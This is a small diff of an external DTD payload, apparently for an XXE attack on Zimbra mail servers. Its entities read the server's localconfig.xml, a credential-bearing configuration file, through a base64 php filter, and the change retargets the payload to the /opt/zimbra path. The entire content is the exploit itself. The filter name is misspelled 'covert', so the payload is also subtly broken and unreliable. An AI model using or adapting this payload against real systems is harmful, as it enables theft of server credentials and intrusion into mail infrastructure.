@@ -1,4 +1,2 @@
-<!ENTITY % file SYSTEM "php://filter/read=covert.base64-encode/resource=file:///etc/zimbra/conf/localconfig.xml">
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
+<!ENTITY % file SYSTEM "php://filter/read=covert.base64-encode/resource=file:///opt/zimbra/conf/localconfig.xml">
+<!ENTITY % all "<!ENTITY fileContents '%file;'>">
